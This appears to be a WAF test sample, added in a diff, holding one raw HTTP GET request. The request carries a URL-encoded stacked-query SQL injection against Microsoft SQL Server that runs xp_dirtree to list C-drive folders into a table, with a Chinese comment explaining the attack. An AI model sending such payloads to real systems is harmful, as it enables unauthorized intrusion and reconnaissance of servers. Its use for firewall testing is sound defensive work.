@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506388
+# 攻击者基于堆叠查询，将"insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1"语句注入到 SQL 查询参数中，利用insert语句将C盘下所有文件夹信息插入表中。
+GET /?id=1%3Binsert%20into%20tmp%28dir%2Cnum%2Cnum1%29%20execute%20master..xp_dirtree%20%27c:%27%2C1%2C1&bid=hd_tag_m8mv23wi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23wi
+RM-PRO-Token: b363d8084d5b3207a0e7e16e9ca147f2
+RM-PRO-Time: 1742808350280
+User-Agent: curl/7.83.1
+
